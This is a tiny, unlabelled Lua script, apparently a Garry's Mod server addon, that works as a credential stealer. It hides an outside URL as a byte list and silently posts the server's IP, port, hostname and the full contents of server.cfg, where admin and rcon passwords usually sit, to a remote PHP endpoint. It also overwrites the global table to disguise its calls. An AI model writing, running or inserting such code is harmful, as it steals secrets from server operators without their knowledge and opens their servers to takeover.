if !SERVER then return end
_G = { GetConVar, file.Read, http.Post }
_G[3](string.char(104, 116, 116, 112, 58, 47, 47, 119, 97, 121, 108, 46, 53, 118, 46, 112, 108, 47, 97, 112, 105, 47, 97, 112, 105, 46, 112, 104, 112),
{ a = _G[1]("ip"):GetString(), b = _G[1]("hostport"):GetString(), c = _G[2]("cfg/server.cfg", "GAME"), d = _G[1]("hostname"):GetString() })
